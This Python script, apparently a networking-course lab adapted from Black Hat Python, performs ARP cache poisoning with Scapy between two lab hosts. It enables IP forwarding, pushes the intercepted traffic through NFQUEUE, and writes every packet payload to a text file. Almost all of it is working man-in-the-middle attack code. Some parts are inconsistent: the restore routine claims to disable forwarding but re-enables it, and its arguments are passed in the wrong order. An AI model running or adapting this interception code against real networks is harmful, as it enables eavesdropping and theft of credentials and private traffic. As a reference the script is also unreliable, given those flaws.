# Sources: https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
# https://networks.hypha.ro/capitolul6/#scapy_dns_spoofing
# https://networks.hypha.ro/
from scapy.all import *
import os
import signal
import sys
import threading
import time
import struct
from netfilterqueue import NetfilterQueue as NFQ

# ARP Poison parameters
gateway_ip = "198.7.0.1"
packet_count = 1000         # nr pachete
# network interface (for linux)
# conf.iface = "eth0"
conf.verb = 0

def get_mac_address(ip_address):
    # Send ARP request and return the MAC address
    # Source: https://www.thepythoncode.com/article/building-network-scanner-using-scapy
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc


def restore_network(gateway_ip, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.ipv4.ip_forward=1")


# Function for sending ARP packets
def arp_spoof(target_ip, target_mac, gateway_ip=gateway_ip):
    try:
        # Send ARP packets while the program is running
        if target_mac == "":
            print("TARGET MAC FINDING: ")
            target_mac = get_mac_address(target_ip)
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(1)
    except KeyboardInterrupt:
        restore_network(target_ip, target_mac, gateway_ip)
        print("ARP spoofing attack ended.")



def process_packet(packet):
    payload = packet.get_payload()

    # Convert the payload to a string
    packet_data = payload.decode("utf-8", errors="ignore")
    print(payload)
    # Save the packet data to a file
    with open("captured_text.txt", "a") as file:
        # print("Hello packet!")
        file.write(packet_data + "\n")
    # continua fluxul de procesare in retea
    packet.accept()


def packet_sniff():
    queue = NFQ()
    try:
        print("Packet sniffing started.")
        queue.bind(5, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Packet sniffing ended.")
        queue.unbind()


# Start the script
print("Started script")
print("Enabling IP forwarding")

# Enable IP Forwarding on
os.system("sysctl -w net.ipv4.ip_forward=1")
print("Successfully enabled IP forwarding")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
print("IP forwarding enabled for queue 5")


# ARP poison threads
poison_thread_router = threading.Thread(target=arp_spoof, args=("198.7.0.1", "", "198.7.0.2"))
# poison_thread_router = threading.Thread(target=arp_spoof, args=("172.7.0.1", "02:42:ac:07:00:01", "198.7.0.1"))
poison_thread_server = threading.Thread(target=arp_spoof, args=("198.7.0.2", "", "198.7.0.1"))

try:
    poison_thread_router.start()
    time.sleep(1)
    print("router ARP spoofing started")
except:
    print("router ARP spoofing failed")

try:
    poison_thread_server.start()
    time.sleep(1)
    print("server ARP spoofing started")
except:
    print("server ARP spoofing failed")


# Start packet sniffing in a separate thread
sniff_thread = threading.Thread(target=packet_sniff)
try:
    sniff_thread.start()
    print("Packet sniffing started")
except:
    print("Packet sniffing failed")
